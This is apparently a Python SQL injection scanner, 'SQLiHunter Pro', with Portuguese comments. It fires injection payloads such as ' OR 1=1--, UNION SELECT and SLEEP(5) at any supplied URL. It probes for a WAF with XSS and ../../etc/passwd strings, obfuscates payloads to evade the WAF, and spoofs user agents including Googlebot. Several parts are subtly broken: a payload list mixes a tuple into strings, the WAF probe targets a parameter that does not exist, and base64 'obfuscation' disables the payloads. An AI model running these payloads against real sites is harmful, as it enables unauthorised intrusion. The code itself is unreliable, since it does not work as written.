#!/usr/bin/env python3
"""
SQLiHunter Pro - Scanner Avançado de SQL Injection com Detecção de Tecnologias
Versão: 4.0 (Estável)
"""

import argparse
import requests
import random
import sys
import re
import base64
import json
from urllib.parse import urlparse, parse_qs, quote_plus
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import difflib
import time
from datetime import datetime

# Inicializar Colorama
init(autoreset=True)

class SQLiHunterPro:
    def __init__(self, args):
        self.url = self.normalize_url(args.url)
        self.method = args.method.upper()
        self.params = self.parse_input(args.params)
        self.cookies = self.parse_cookies(args.cookies)
        self.headers = self.parse_headers(args.headers)
        self.delay = args.delay
        self.timeout = args.timeout
        self.verbose = args.verbose
        self.proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}
        self.threads = args.threads
        self.waf_detected = False
        self.user_agents = self.load_user_agents()
        self.session = requests.Session()
        self.session.proxies.update(self.proxies)
        self.found_vulnerabilities = []
        self.tech_stack = {}
        self.cve_db = self.load_cve_db(args.cve_db)
        self.test_stats = {
            'parameters_tested': 0,
            'payloads_sent': 0,
            'start_time': datetime.now(),
            'vulnerabilities_found': 0
        }

        self.waf_triggers = ['cloudflare', 'akamai', 'incapsula', 'mod_security']
        self.obfuscation_level = 3 if args.waf_bypass else 1
        self.payloads_file = args.payloads

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            return 'http://' + url
        return url

    def load_cve_db(self, db_path):
        try:
            with open(db_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.print_error(f"Erro ao carregar CVE DB: {str(e)}", "load_cve_db")
            return {}

    def parse_input(self, input_str):
        try:
            return {k: v[0] for k, v in parse_qs(input_str or '').items()}
        except Exception as e:
            self.print_error(f"Erro ao analisar parâmetros: {str(e)}", "parse_input")
            return {}

    def parse_cookies(self, cookie_str):
        try:
            return dict(c.split('=', 1) for c in (cookie_str or '').split('; ') if '=' in c)
        except Exception as e:
            self.print_error(f"Erro ao analisar cookies: {str(e)}", "parse_cookies")
            return {}

    def parse_headers(self, header_str):
        try:
            return dict(h.split(':', 1) for h in (header_str or '').split('; ') if ':' in h)
        except Exception as e:
            self.print_error(f"Erro ao analisar cabeçalhos: {str(e)}", "parse_headers")
            return {}

    def load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]

    def detect_technology(self, response):
        self.tech_stack = {
            'webserver': [],
            'programming': [],
            'javascript': [],
            'cms': [],
            'database': [],
            'analytics': []
        }

        # Detecção via headers
        headers = response.headers
        self.detect_from_headers(headers)
        
        # Detecção via conteúdo HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        self.detect_from_html(response.text, soup)
        
        # Detecção via cookies
        self.detect_from_cookies(response.cookies)

    def detect_from_headers(self, headers):
        server = headers.get('Server', '').lower()
        if 'apache' in server:
            self.tech_stack['webserver'].append('Apache')
        elif 'nginx' in server:
            self.tech_stack['webserver'].append('Nginx')
        elif 'microsoft-iis' in server:
            self.tech_stack['webserver'].append('IIS')

        powered_by = headers.get('X-Powered-By', '')
        if 'PHP' in powered_by:
            self.tech_stack['programming'].append('PHP')
        elif 'ASP.NET' in powered_by:
            self.tech_stack['programming'].append('ASP.NET')

    def detect_from_html(self, html, soup):
        # Meta tags
        meta_generator = soup.find('meta', {'name': 'generator'})
        if meta_generator:
            content = meta_generator.get('content', '')
            if 'WordPress' in content:
                self.tech_stack['cms'].append('WordPress')
            elif 'Joomla' in content:
                self.tech_stack['cms'].append('Joomla')

        # Scripts
        for script in soup.find_all('script', {'src': True}):
            src = script['src'].lower()
            if 'jquery' in src:
                self.tech_stack['javascript'].append('jQuery')
            if 'react' in src:
                self.tech_stack['javascript'].append('React')
            if 'angular' in src:
                self.tech_stack['javascript'].append('Angular')

        # Padrões HTML
        if 'wp-content' in html:
            self.tech_stack['cms'].append('WordPress')
        if 'shopify' in html.lower():
            self.tech_stack['cms'].append('Shopify')

    def detect_from_cookies(self, cookies):
        for cookie in cookies:
            if 'wordpress_logged_in' in cookie.name:
                self.tech_stack['cms'].append('WordPress')
            if 'laravel_session' in cookie.name:
                self.tech_stack['programming'].append('Laravel')

    def waf_detection(self):
        test_payloads = [
            "' OR 1=1-- ",
            "<script>alert(1)</script>",
            "../../etc/passwd"
        ]
        for payload in test_payloads:
            response = self.send_request(payload, "waf_test")
            if response and (response.status_code == 403 or 'waf' in response.text.lower()):
                return True
        return False

    def obfuscate_payload(self, payload):
        techniques = [
            lambda x: x.replace(' ', '/**/'),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: x.upper() if random.random() > 0.5 else x.lower(),
            lambda x: x.replace('AND', '%0aAND%0a')
        ]
        for _ in range(self.obfuscation_level):
            payload = random.choice(techniques)(payload)
        return payload

    def send_request(self, payload, param_name):
        try:
            if self.delay:
                time.sleep(self.delay)

            target_params = self.params.copy()
            target_params[param_name] += self.obfuscate_payload(payload)
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                **self.headers
            }

            start_time = time.time()
            if self.method == 'GET':
                response = self.session.get(
                    self.url,
                    params=target_params,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                response = self.session.post(
                    self.url,
                    data=target_params,
                    cookies=self.cookies,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            response.elapsed = time.time() - start_time
            self.test_stats['payloads_sent'] += 1
            return response

        except Exception as e:
            if self.verbose:
                self.print_error(f"Erro na requisição: {str(e)}", "send_request")
            return None

    def test_vulnerabilities(self, param):
        self.test_stats['parameters_tested'] += 1
        original_response = self.send_request('', param)
        if not original_response:
            return

        self.detect_technology(original_response)
        self.print_tech_stack()

        # Teste de vulnerabilidades
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(self.test_error_based, param, original_response),
                executor.submit(self.test_blind_sqli, param, original_response)
            ]
            
            for future in futures:
                result, vuln_type, cwe = future.result()
                if result:
                    self.report_vulnerability(param, vuln_type, cwe)

    def test_error_based(self, param, original_response):
        payloads = [
            ("'", "CWE-89"),
            "' OR 1=1-- ",
            "' UNION SELECT null-- "
        ]
        for payload in payloads:
            response = self.send_request(payload, param)
            if response and 'SQL syntax' in response.text:
                return True, "Error-based SQLi", "CWE-89"
        return False, "", ""

    def test_blind_sqli(self, param, original_response):
        payload = "' OR SLEEP(5)-- "
        start_time = time.time()
        response = self.send_request(payload, param)
        if response and (time.time() - start_time) >= 5:
            return True, "Blind SQLi (Time-based)", "CWE-89"
        return False, "", ""

    def report_vulnerability(self, param, vuln_type, cwe):
        cves = self.cve_db.get(cwe, [])
        print(f"\n{Fore.RED}[!] Vulnerabilidade encontrada em {param}:")
        print(f"{Fore.YELLOW}Tipo: {vuln_type}")
        print(f"CWE: {cwe}")
        if cves:
            print(f"CVEs Relacionados: {', '.join(cves)}")
        print(Style.RESET_ALL)
        
        self.found_vulnerabilities.append({
            'parameter': param,
            'type': vuln_type,
            'cwe': cwe,
            'cves': cves
        })
        self.test_stats['vulnerabilities_found'] += 1

    def print_tech_stack(self):
        print(f"\n{Fore.CYAN}[*] Tecnologias Detectadas:")
        for category, techs in self.tech_stack.items():
            if techs:
                print(f"  {Fore.WHITE}{category.title()}: {Fore.GREEN}{', '.join(techs)}")
        print(Style.RESET_ALL)

    def print_status(self, message):
        print(f"{Fore.CYAN}[*] {message}{Style.RESET_ALL}")

    def print_error(self, message, context=""):
        print(f"{Fore.RED}[ERRO] {message} ({context}){Style.RESET_ALL}")

    def print_summary(self):
        duration = datetime.now() - self.test_stats['start_time']
        print(f"\n{Fore.CYAN}=== RESUMO DA VARREdura ===")
        print(f"Tempo Total: {duration.total_seconds():.2f}s")
        print(f"Parâmetros Testados: {self.test_stats['parameters_tested']}")
        print(f"Payloads Enviados: {self.test_stats['payloads_sent']}")
        print(f"Vulnerabilidades Encontradas: {self.test_stats['vulnerabilities_found']}")
        print("=============================")

    def scan(self):
        self.print_status("Iniciando análise de segurança...")
        
        if self.waf_detection():
            self.print_status("WAF Detectado - Ativando técnicas de bypass")
            self.obfuscation_level = 5

        parsed = urlparse(self.url)
        params = parse_qs(parsed.query).keys() if self.method == 'GET' else self.params.keys()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.test_vulnerabilities, params)

        self.print_summary()

def show_banner():
    print(f"""{Fore.CYAN}
    ███████╗ ██████╗ ██╗     ██╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ██╔════╝██╔═══██╗██║     ██║██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ███████╗██║   ██║██║     ██║███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ╚════██║██║   ██║██║     ██║██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ███████║╚██████╔╝███████╗██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    {Fore.WHITE}SQLiHunter Pro v4.0 - Detecção Avançada de Tecnologias e Vulnerabilidades{Style.RESET_ALL}""")

def main():
    parser = argparse.ArgumentParser(description='SQLiHunter Pro - Advanced Web Security Scanner')
    parser.add_argument('--url', required=True, help='URL alvo para teste')
    parser.add_argument('--method', default='GET', choices=['GET', 'POST'], help='Método HTTP')
    parser.add_argument('--params', help='Parâmetros da requisição (ex: param1=val1&param2=val2)')
    parser.add_argument('--cookies', help='Cookies no formato "key1=val1; key2=val2"')
    parser.add_argument('--headers', help='Cabeçalhos HTTP no formato "Header1:Val1; Header2:Val2"')
    parser.add_argument('--cve-db', default='cve_db.json', help='Arquivo JSON com base de dados de CVEs')
    parser.add_argument('--threads', type=int, default=5, help='Número de threads paralelas')
    parser.add_argument('--waf-bypass', action='store_true', help='Ativar modo de bypass de WAF')
    parser.add_argument('--delay', type=float, default=0.5, help='Atraso entre requisições (segundos)')
    parser.add_argument('--proxy', help='Proxy para usar nas requisições')
    parser.add_argument('--verbose', action='store_true', help='Modo detalhado')

    args = parser.parse_args()
    
    try:
        show_banner()
        scanner = SQLiHunterPro(args)
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Varredura interrompida pelo usuário{Style.RESET_ALL}")
        scanner.print_summary()
        sys.exit(1)

if __name__ == '__main__':
    main()